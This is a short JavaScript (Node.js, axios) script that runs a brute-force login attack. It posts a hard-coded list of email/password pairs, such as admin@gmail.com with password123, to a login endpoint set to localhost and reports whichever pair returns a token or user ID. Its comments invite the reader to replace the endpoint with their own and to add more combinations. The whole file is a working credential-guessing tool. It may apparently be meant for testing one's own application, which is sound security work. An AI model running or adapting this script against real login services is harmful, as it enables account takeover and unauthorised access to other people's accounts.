const axios = require("axios");

const url = "http://localhost:5000/api/user/login"; // Replace with your login endpoint
const credentialsList = [
  { email: "admin@gmail.com", password: "password123" },
  { email: "tes@gmail.com", password: "tes" },
  { email: "guest@gmail.com", password: "guest123" },
  // Add more combinations
];

async function bruteForceAttack() {
  for (const creds of credentialsList) {
    try {
      console.log(`Attempting: ${JSON.stringify(creds)}`);
      const response = await axios.post(url, creds, {
        headers: { "Content-type": "application/json" },
      });

      // Check if response contains token or user ID to determine success
      if (response.data.token || response.data._id) {
        console.log(`Success! Credentials: ${JSON.stringify(creds)}`);
        console.log(`Response: ${JSON.stringify(response.data)}`);
        break; // Stop further attempts after a success
      } else {
        console.log(
          `Failed: ${JSON.stringify(creds)} | Response: ${JSON.stringify(
            response.data
          )}`
        );
      }
    } catch (error) {
      if (error.response) {
        console.log(
          `Failed: ${JSON.stringify(creds)} | Status: ${
            error.response.status
          } | Response: ${JSON.stringify(error.response.data)}`
        );
      } else {
        console.log(
          `Failed: ${JSON.stringify(creds)} | Error: ${error.message}`
        );
      }
    }
  }
}

bruteForceAttack();
